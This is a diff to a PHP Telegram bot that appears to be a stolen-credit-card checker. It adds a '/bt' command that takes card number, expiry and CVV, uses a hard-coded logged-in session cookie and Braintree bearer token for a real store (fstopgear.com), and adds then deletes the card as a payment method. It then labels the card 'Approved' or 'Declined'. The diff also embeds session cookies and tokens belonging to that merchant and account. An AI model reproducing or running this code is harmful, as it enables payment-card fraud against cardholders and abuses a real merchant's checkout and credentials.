@@ -855,7 +855,7 @@ elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(st
 
 elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
         //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree Auth ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Braintree Auth (Wa)✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Stripe 3D ✔\n➣ Command ➟ /ta\n⁕ Status: ON!✅\n\n🔥 Woo Stripe ✔\n➣ Command ➟ /wo\n⁕ Status: ON!✅\n\n🔥 Braintree_CCN ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -1794,8 +1794,6 @@ if (empty($respo)) {
 /*if ($respo == "SUCCEEDED"){
     $respo = "Charged $5";
 }*/
-
-
 $logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";
 
 if (array_in_string($respo, $live_array)) {
@@ -2037,6 +2035,9 @@ ob_flush();
 
 
 
+
+
+/////GATES AUTH////
 
 elseif((strpos($message, "!wo") === 0)||(strpos($message, "/wo") === 0)||(strpos($message, ".wo") === 0)){
 $lista = substr($message, 4);
@@ -2317,7 +2318,259 @@ if ($live) {
 ob_flush();
 
 }
-	
+
+
+elseif((strpos($message, "!bt") === 0)||(strpos($message, "/bt") === 0)||(strpos($message, ".bt") === 0)){
+$lista = substr($message, 4);
+$i = preg_split('/[|:| ]/', $lista);
+$cc    = $i[0];
+$mes   = $i[1];
+$ano   = $i[2];
+//$ano  = trim(substr($i[2], -2));
+$cvv   = $i[3];
+
+if (strlen($ano) == 2) {
+    $ano = '20' . $ano;
+}
+
+if (strlen($mes) == 1 && $mes <= 9) {
+    $mes = '0' . $mes;
+}
+
+$bin = substr($lista, 0, 6);
+$num = "$cc$mes$ano1$cvv";
+//-----------------------------------------------------//
+
+
+//Verifi//
+if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
+    $respuesta = "🚫 Oops!\nUse this format: /bt CC|MM|YYYY|CVV\n";
+    sendMessage($chat_id, $respuesta, $message_id);
+    die();
+}
+
+
+//----------------MENSAGE DE ESPERA-------------------//
+$respuesta = "<b>🕒 Wait for Result...</b>";
+sendMessage($chat_id,$respuesta, $message_id);
+//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
+$id_text = file_get_contents("ID");
+        //----------------------------------------------------//
+
+
+$startTime = microtime(true); //TIEMPO DE INICIO
+$BinData = BinData($bin); //Extrae los datos del bin
+
+///SACA EL NONCE///
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'ac_enable_tracking=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2017%3A23%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2025-01-27%2017%3A23%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; __stripe_sid=e3af39e4-7c23-4e16-8f62-cd42f017171ac09c0f; yith_wcmcs_currency=USD; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=xipay59414%7C1739208351%7CC9BaUKB1fMIHiO0A5l0mqnc4TMCynOzk5HYR5EPUpAo%7Cdd427edd05095f84ddce0dce0ed91427fbf0bd3ed46cbe9092c35150d3ec2a32; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16386%7C%7C1738171519%7C%7C1738167919%7C%7Cf8df7b0e07cc467473eb185cabd6176f; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.8',
+    'referer: https://fstopgear.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+
+
+//file_put_contents('index.html', $response);
+//$response = file_get_contents('index.html');
+$patron = '/name="woocommerce-add-payment-method-nonce" value="([^"]+)"/';
+preg_match($patron, $response, $coincidencias);
+$nonce = $coincidencias[1];
+echo "$nonce\n"; // Output: 5f49251774
+
+
+////SACA EL TOKEN/
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"512344ed-2b82-4b43-86c2-52904d9f579f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"10010","streetAddress":"6195 bollinger rd"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/json',
+    'sec-ch-ua-platform: "Android"',
+    'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgxMDA0MTEsImp0aSI6IjhhNmUwNWVkLTY1Y2YtNDZmYi1iZGFlLTg4ZDE1ZGVkMWZlYiIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImZzdG9wbGxjX2luc3RhbnQifX0.G8IPLVySLb5e4F-2AbhqCEDQFKxc6aPiFJd4RIY-2sQuH94d1nkdiBTgLnVy__vDksvkArnC9yLxAmLIGBUMnA',
+    'braintree-version: 2018-05-10',
+    'accept-language: es-US,es;q=0.8',
+    'origin: https://assets.braintreegateway.com',
+    'referer: https://assets.braintreegateway.com/',
+  ],
+]);
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$id = $json["data"]["tokenizeCreditCard"]["token"];
+curl_close($curl);
+
+$cadena = 'payment_method=braintree_cc&braintree_cc_nonce_key='.$id.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%22b39f80d1e12a3acb47b09d5d4107dcca%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22512344ed-2b82-4b43-86c2-52904d9f%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fsxp92tvhvfzqjd9y%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fsxp92tvhvfzqjd9y%22%7D%2C%22merchantId%22%3A%22sxp92tvhvfzqjd9y%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22sxp92tvhvfzqjd9y%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzgxMDAzNjgsImp0aSI6ImQwZjg2ODBlLTQ5NGItNGQ4MC1iZjNkLWNjYTFkM2ZiZGI0NiIsInN1YiI6InN4cDkydHZodmZ6cWpkOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InN4cDkydHZodmZ6cWpkOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.KLkkow4p3ucWK0nVIzYWEcsEFjMW5kVUaFsyTAw8_GzSiF6T03cusQwCCOB0RippgU8Ajl_PSUrV8ntaoMHMGA%22%2C%22paypalClientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22f-stop+LLC%22%2C%22clientId%22%3A%22AbRISQxzl3KPhfX0pGGBRibYHMj92QWlu58vnESp9A6VVb3qIG7DFUlI9Lw7bcuAkIkKbpvusTM50nZ6%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22fstopllc_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&woocommerce-add-payment-method-nonce=NONCE1&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1';
+$data = str_replace('NONCE1', $nonce, $cadena);
+
+///HACE LA COMPRA///
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://fstopgear.com/my-account/add-payment-method/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => $data,
+  CURLOPT_COOKIE => 'ac_enable_tracking=1; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; yith_wcmcs_currency=USD; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=xipay59414%7C1739208351%7CC9BaUKB1fMIHiO0A5l0mqnc4TMCynOzk5HYR5EPUpAo%7Cdd427edd05095f84ddce0dce0ed91427fbf0bd3ed46cbe9092c35150d3ec2a32; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16386%7C%7C1738171519%7C%7C1738167919%7C%7Cf8df7b0e07cc467473eb185cabd6176f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2021%3A38%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2025-01-27%2021%3A38%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'origin: https://fstopgear.com',
+    'accept-language: es-US,es;q=0.8',
+    'referer: https://fstopgear.com/my-account/add-payment-method/',
+  ],
+]);
+
+
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+//file_put_contents('/sdcard/index.html', $response);
+curl_close($curl);
+
+$patron = '/<div class="wc-block-components-notice-banner__content">(.*?)<\/div>/s';
+preg_match($patron, $response, $coincidencias);
+$mensaje = trim($coincidencias[1]);
+$patron = '/Reason: (.*)/';
+preg_match($patron, $mensaje, $coincidencias);
+$respo = $coincidencias[1];
+
+if (empty($respo)){
+$respo = trim($mensaje);
+}
+
+//if (empty($respo)){
+//$respo = "Payment method successfully added.";
+//}
+
+
+if (empty($respo)){
+//if ($respo == "Payment method successfully added.") {
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://fstopgear.com/my-account/payment-methods/',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'ac_enable_tracking=1; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; yith_wcmcs_currency=USD; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=xipay59414%7C1739208351%7CC9BaUKB1fMIHiO0A5l0mqnc4TMCynOzk5HYR5EPUpAo%7Cdd427edd05095f84ddce0dce0ed91427fbf0bd3ed46cbe9092c35150d3ec2a32; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16386%7C%7C1738171519%7C%7C1738167919%7C%7Cf8df7b0e07cc467473eb185cabd6176f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2020%3A00%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-27%2020%3A00%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=af63fe76-6a99-4e3b-8653-90f5267b119febb0c1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.7',
+    'referer: https://fstopgear.com/my-account/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
+preg_match($patron, $response, $coincidencias);
+$url_nonce = $coincidencias[0];
+curl_close($curl);
+
+echo "$url_nonce\n";
+
+if (!empty($url_nonce)){
+$respo = "Payment method successfully added.";
+}
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://fstopgear.com/my-account/delete-payment-method'.$url_nonce.'',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'GET',
+  CURLOPT_COOKIE => 'ac_enable_tracking=1; __stripe_mid=cb6543e0-289b-4747-959a-773956e4b9e15eced5; yith_wcmcs_currency=USD; fp_logged_in_roles=customer; wordpress_logged_in_92ff63d1ba7051ba8c3b940c6bfa0f68=xipay59414%7C1739208351%7CC9BaUKB1fMIHiO0A5l0mqnc4TMCynOzk5HYR5EPUpAo%7Cdd427edd05095f84ddce0dce0ed91427fbf0bd3ed46cbe9092c35150d3ec2a32; wp_woocommerce_session_92ff63d1ba7051ba8c3b940c6bfa0f68=16386%7C%7C1738171519%7C%7C1738167919%7C%7Cf8df7b0e07cc467473eb185cabd6176f; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-27%2020%3A00%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2025-01-27%2020%3A00%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=af63fe76-6a99-4e3b-8653-90f5267b119febb0c1; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ffstopgear.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.7',
+    'referer: https://fstopgear.com/my-account/payment-methods/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
+}
+
+//echo "RESPO: $respo\n"; // Output: There was an error saving your payment method. Reason: Declined - Call Issuer
+
+$timetakeen = (microtime(true) - $startTime);
+$time = substr_replace($timetakeen, '', 4);
+$proxy = "LIVE ✅";
+
+$bin = "<code>".$bin."</code>";
+$lista = "<code>".$lista."</code>";
+
+
+if (empty($respo)) {
+        $respo = "Error de solicitud!";
+}
+
+
+//	𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑
+//	𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝!
+//	𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝
+if (array_in_string($respo, $live_array)) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
+    $live = True;
+} elseif (strpos($respo, 'Call Issuer. Pick Up Card.') !== false || strpos($respo, 'Declined - Call Issuer') !== false || strpos($respo, 'Processor Declined') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
